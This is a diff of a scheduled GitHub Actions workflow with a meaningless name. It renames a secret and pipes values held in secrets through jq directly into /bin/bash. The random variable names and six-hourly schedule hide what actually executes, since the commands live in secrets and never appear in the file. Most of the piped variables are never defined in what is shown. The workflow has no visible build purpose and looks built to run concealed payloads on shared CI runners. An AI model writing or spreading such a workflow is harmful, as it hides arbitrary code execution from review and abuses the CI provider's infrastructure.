@@ -2,24 +2,21 @@ name: numberfreethrow
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 5/6 * * *'
-
-jobs:  # 13457
+    - cron: '55 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: numberfreethrow
         env:
-          assoq213: ${{ secrets.assoq213 }}
+          m29: ${{ secrets.m29 }}
         run: |
-          echo $assoq213 | jq -r .qajyb9 | /bin/bash
-          echo $hrsd87 | jq -r .wh1 | /bin/bash
-          echo $k48011 | jq -r .lho71 | /bin/bash
-          echo $ltg99 | jq -r .pmvek4309 | /bin/bash
-          echo $ohy765 | jq -r .mgz96513 | /bin/bash
-          echo $u41 | jq -r .io7 | /bin/bash
-          echo $x123 | jq -r .wxd1168 | /bin/bash
-          echo $fdnt586 | jq -r .vr08 | /bin/bash
+          echo $m29 | jq -r .tjh2 | /bin/bash
+          echo $j9439 | jq -r .q8985 | /bin/bash
+          echo $sucwc64 | jq -r .ltp3 | /bin/bash
+          echo $lwb1 | jq -r .hvc4 | /bin/bash
+          echo $olkmk217 | jq -r .slwzw2 | /bin/bash
+          echo $ghkqf71 | jq -r .cpyy5252 | /bin/bash
+          echo $btsnz3978 | jq -r .sirx043 | /bin/bash
 
